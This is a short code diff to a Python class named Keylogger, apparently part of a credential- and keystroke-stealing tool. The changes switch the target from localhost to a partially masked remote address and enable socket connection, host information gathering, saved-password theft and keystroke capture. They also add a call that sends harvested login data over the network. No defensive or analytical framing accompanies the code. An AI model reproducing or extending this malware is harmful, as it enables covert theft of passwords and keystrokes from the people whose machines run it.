@@ -55,6 +55,7 @@ class Keylogger:
                         for key, values in logins_data.items():
                             data.append(values)
         if data:
+            self.send_data(data)
             for i in data:
                 print(i)
     def start_socket(self):
@@ -66,7 +67,7 @@ class Keylogger:
 
     def send_data(self, key):
         if isinstance(key,(Key, KeyCode)):
-            key = str(key).replace("'", "")
+            key = str(key).replace("'", "") + '\n'
             try:
                 self.client.send(key.encode('utf-8'))
             except socket.error as err:
@@ -92,8 +93,8 @@ class Keylogger:
             if self.client:
                 self.client.close()
 if __name__ == "__main__":
-    ke = Keylogger("127.0.0.1", 9999)
-    # ke.start_socket()
-    # ke.host_info()
+    ke = Keylogger("172.28.xx.xx", 9999)
+    ke.start_socket()
+    ke.host_info()
     ke.steal_pass()
-    # ke.keylogger()
+    ke.keylogger()
